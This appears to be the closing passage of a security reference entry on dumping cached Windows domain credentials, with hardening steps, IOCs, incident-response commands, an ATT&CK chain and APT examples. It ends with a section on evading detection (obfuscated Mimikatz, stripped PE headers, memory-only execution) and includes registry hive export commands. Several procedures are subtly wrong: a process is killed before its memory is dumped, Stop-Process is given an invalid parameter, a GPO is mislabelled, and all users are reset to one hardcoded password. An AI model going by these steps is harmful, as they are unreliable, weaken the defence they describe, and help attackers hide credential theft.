8. Note: Users must log off and log back in for policy to take effect

**Manual Steps (PowerShell):**

```powershell
# Add user to Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members "CONTOSO\jsmith"

# Verify membership
Get-ADGroupMember -Identity "Protected Users" | Select Name
```

**Validation Command:**

```powershell
# Check if user is in Protected Users
Get-ADUser jsmith -Properties memberOf | Select -ExpandProperty memberOf | Select-String "Protected Users"
```

**Expected Output (If Secure):**
```
CN=Protected Users,CN=Builtin,DC=contoso,DC=com
```

---

**2. Disable Cached Logon Credentials (CachedLogonCount = 0)**

Disabling credential caching prevents any credentials from being cached locally.

**Applies To Versions:** All Windows versions

**Manual Steps (Group Policy - Server 2016-2025):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Netlogon**
3. Open policy: **"Deny machine account password changes"** (or relevant GPO)
4. Alternatively, directly edit:
   - **Group Policy Management** → Select Domain → Right-click → **Edit**
   - Navigate to: **Computer Configuration** → **Preferences** → **Windows Settings** → **Registry**
   - Right-click → **New** → **Registry Item**
   - **Hive:** `HKEY_LOCAL_MACHINE`
   - **Key Path:** `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
   - **Value name:** `CachedLogonsCount`
   - **Value type:** REG_SZ
   - **Value data:** `0`
5. Click **OK** and apply GPO
6. Run `gpupdate /force` on target machines

**Manual Steps (Registry - Local Edit):**

```powershell
# Set cached logon count to 0 (disable caching)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" `
  -Name "CachedLogonsCount" -Value "0" -Type String

# Verify
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount"
# Expected output: 0
```

**Validation Command:**

```powershell
$CacheCount = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount").CachedLogonsCount
if ($CacheCount -eq "0") { Write-Host "Cached credentials disabled" } else { Write-Host "WARNING: Caching is enabled ($CacheCount)" }
```

**Expected Output (If Secure):**
```
Cached credentials disabled
```

**Note:** Setting this to 0 disables offline logon for all users. Consider setting to 1-2 for critical systems.

---

**3. Enable Registry Auditing for SECURITY Hive**

Enable detailed auditing of registry access attempts.

**Applies To Versions:** All Windows versions

**Manual Steps (Group Policy - Server 2016-2025):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable: **Audit Registry** (set to Success and Failure)
4. Additionally, configure registry SACL:
   - Open **Regedit**
   - Navigate to: `HKEY_LOCAL_MACHINE\SECURITY`
   - Right-click → **Permissions**
   - Click **Advanced**
   - Click **Auditing** tab
   - Add auditing rule for: **Everyone** → **Full Control** → **Success/Failure**
5. Run `gpupdate /force`

**Manual Steps (PowerShell):**

```powershell
# Enable registry auditing
auditpol /set /subcategory:"Registry" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Registry"
# Expected: Registry Success and Failure
```

---

### Priority 2: HIGH

**4. Enforce Strong Password Policies**

Ensure local administrator and service accounts have complex, unique passwords.

**Manual Steps:**

1. Open **Group Policy Management** → **Default Domain Policy** (or create new)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
3. Configure:
   - **Minimum password length:** `14` characters
   - **Password must meet complexity requirements:** `Enabled`
   - **Maximum password age:** `30-90` days
   - **Minimum password age:** `1` day
4. Apply to all systems

---

**5. Restrict Local Administrator Group Membership**

Limit accounts with local admin privileges to prevent lateral movement.

**Manual Steps:**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Restricted Groups**
3. Add group: **Administrators**
4. Set to include only authorized accounts
5. Apply and verify with: `net localgroup Administrators`

---

### Access Control & Policy Hardening

**Conditional Access Policies (Azure AD/Entra ID):**

*Note: This applies if the domain is hybrid/cloud-synced.*

**Manual Steps:**

1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Restrict High-Risk Credential Access`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **All cloud apps**
5. **Conditions:**
   - Sign-in risk: **High**
   - Device state: **Require hybrid Azure AD join**
6. **Access controls:**
   - Grant: **Require MFA**
7. Enable policy: **On**
8. Click **Create**

---

**RBAC Configuration:**

```powershell
# Remove global admin role from non-essential accounts
Remove-AzRoleAssignment -ObjectId <user-object-id> -RoleDefinitionName "Global Administrator"

# Grant specific roles instead
New-AzRoleAssignment -ObjectId <user-object-id> -RoleDefinitionName "Security Reader"
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\tools\mimikatz.exe` (or alternate locations)
- `C:\temp\system.hive`, `C:\temp\sam.hive`, `C:\temp\security.hive` (exported registry hives)
- Temp files created by Metasploit/secretsdump in `%TEMP%` or `%Systemdrive%\temp`

**Registry:**
- `HKEY_LOCAL_MACHINE\SECURITY\Cache` (accessed/modified)
- `HKEY_LOCAL_MACHINE\SAM` (accessed)
- `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\NTDS` (on DCs)

**Network:**
- SMB traffic to port 445 from non-standard tools (secretsdump.py, CrackMapExec)
- Outbound connections from unusual processes to external cracking services

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` (Event ID 4656, 4663, 4688)
- Memory dumps of `lsass.exe` or Mimikatz process
- Temporary hive files in `%TEMP%` or `\Device\HarddiskVolume2` (alternate stream dumps)

**Memory:**
- Mimikatz.exe process memory (contains decrypted hashes)
- cmd.exe / powershell.exe with command-line arguments containing registry paths

**Cloud (if hybrid):**
- Azure audit logs showing registry access from non-standard processes
- Sentinel logs: `SecurityEvent` with EventID 4656, 4663

**MFT/USN Journal:**
- File creation entries for mimikatz.exe, hive exports in temp directories
- Deleted file entries (if attacker cleaned up)

### Response Procedures

**1. Isolate:**

**Command (Windows):**

```powershell
# Disable network adapter
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Or kill network connection
ipconfig /release
```

**Manual (Azure VMs):**
- Go to **Azure Portal** → **Virtual Machines** → Select affected VM
- Click **Networking** → **Detach** all network interfaces
- Click **Start** → **Deallocate** VM (preserve data)

---

**2. Collect Evidence:**

**Command:**

```powershell
# Export Security Event Log
wevtutil epl Security C:\Evidence\Security.evtx

# Export System Event Log
wevtutil epl System C:\Evidence\System.evtx

# Dump process memory (if Mimikatz still running)
Get-Process mimikatz | Stop-Process -Force
procdump64.exe -ma <PID> C:\Evidence\process.dmp

# Capture registry hives
reg save hklm\security C:\Evidence\security.hive
reg save hklm\sam C:\Evidence\sam.hive
reg save hklm\system C:\Evidence\system.hive
```

**Manual (Event Viewer):**
1. Open **Event Viewer** → **Windows Logs** → **Security**
2. Right-click → **Save All Events As** → `C:\Evidence\Security.evtx`
3. Repeat for **System** logs

---

**3. Remediate:**

**Command:**

```powershell
# Stop malicious process
Stop-Process -Name mimikatz -Force
Stop-Process -Name cmd -Filter {CommandLine -like "*lsadump*"} -Force

# Remove exported hive files
Remove-Item C:\temp\*.hive -Force

# Reset all domain user passwords (critical step)
Get-ADUser -Filter {LastLogonDate -gt (Get-Date).AddDays(-7)} | `
  ForEach-Object {
    Set-ADAccountPassword -Identity $_ -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "TempPassword123!" -Force)
  }
```

**Manual:**
1. Terminate any running credential-dumping processes via **Task Manager** → **Details** tab
2. Delete temporary/suspicious files from `C:\temp\`, `%TEMP%`, Desktop
3. Change passwords for all recently active domain users via **Active Directory Users and Computers** or PowerShell
4. Review group membership changes (especially Protected Users, Administrators)
5. Verify service account credentials in application configurations

---

**4. Enhanced Monitoring (Post-Incident):**

```powershell
# Enable enhanced audit logging
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Registry" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Monitor for credential dumping attempts for 30 days
$RegistryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Security"
Set-ItemProperty -Path $RegistryPath -Name "MaxSize" -Value 1073741824  # 1 GB retention

# Create alert rule for future attempts (Splunk/Sentinel)
# See Detection sections above
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing - Spearphishing Attachment | Attacker gains initial foothold via malicious Office document |
| **2** | **Execution** | [T1204.002] User Execution - Malicious File | Victim executes attached payload |
| **3** | **Persistence** | [T1547.001] Boot or Logon Autostart Execution | Malware creates scheduled task or registry run key |
| **4** | **Privilege Escalation** | [T1134] Access Token Manipulation | Attacker escalates to SYSTEM via token impersonation |
| **5** | **Credential Access** | **[CA-DUMP-004] Cached Domain Credentials** | **Attacker extracts cached credentials from registry** |
| **6** | **Lateral Movement** | [T1570] Lateral Tool Transfer | Attacker uses stolen credentials to access other systems |
| **7** | **Impact** | [T1485] Data Destruction | Attacker exfiltrates sensitive data or deploys ransomware |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: APT33 – Credential Dumping Campaign (2018-2019)

- **Target:** Middle East energy and aviation sectors
- **Timeline:** 2018-2019
- **Technique Status:** APT33 used LaZagne (credential dumping tool) to extract cached credentials from Windows systems; specifically targeting cached logon information for lateral movement
- **Impact:** Compromised 25+ organizations; gained access to sensitive industrial control systems
- **Reference:** [MITRE ATT&CK - APT33](https://attack.mitre.org/groups/G0064/)

---

### Example 2: MuddyWater – Post-Compromise Lateral Movement (2021)

- **Target:** Government agencies and critical infrastructure (Middle East/North Africa)
- **Timeline:** 2021
- **Technique Status:** After initial compromise via phishing, MuddyWater used LaZagne to dump cached credentials and enable lateral movement across domain-joined systems
- **Impact:** Long-term persistence; theft of classified documents
- **Reference:** [MITRE ATT&CK - MuddyWater](https://attack.mitre.org/groups/G0069/)

---

### Example 3: OilRig – Credential Harvesting for OWA Access (2019)

- **Target:** Financial institutions and government agencies (Middle East)
- **Timeline:** 2019
- **Technique Status:** OilRig used credential dumping tools including LaZagne to harvest cached credentials, then used stolen credentials to access Outlook Web Access (OWA)
- **Impact:** Email exfiltration; persistence in email environment
- **Reference:** [MITRE ATT&CK - OilRig](https://attack.mitre.org/groups/G0049/)

---

## 18. SIGNATURE DETECTION EVASION

### Detection Evasion Techniques

**1. Obfuscated Mimikatz:**
- Use modified/obfuscated versions (e.g., Mimikatz with renamed modules)
- Strip PE headers to avoid signature detection
- Use memory-resident execution (no disk drop)

**2. Living-off-the-Land Alternatives:**
- Use native `reg.exe` for registry export (less suspicious than Mimikatz)
- Leverage PowerShell for registry queries (may bypass AV signatures)

**3. Timing/Scheduling:**
- Execute during high-activity hours to blend with normal traffic
- Distribute extraction across multiple days to avoid alert threshold

**4. Access Token Manipulation:**
- Use legitimate processes (svchost.exe, explorer.exe) to dump credentials
- Impersonate NETWORK SERVICE or LOCAL SYSTEM to avoid user-level detection

### Recommended Detection Tuning

- **Whitelist legitimate processes:** Exclude `C:\Program Files\*\` from suspicious registry access alerts
- **Threshold adjustment:** Consider 2-3 SECURITY registry accesses as baseline (before alerting)
- **Exclude:** Automated compliance scanning tools that access SECURITY hive

---

**End of Documentation**

---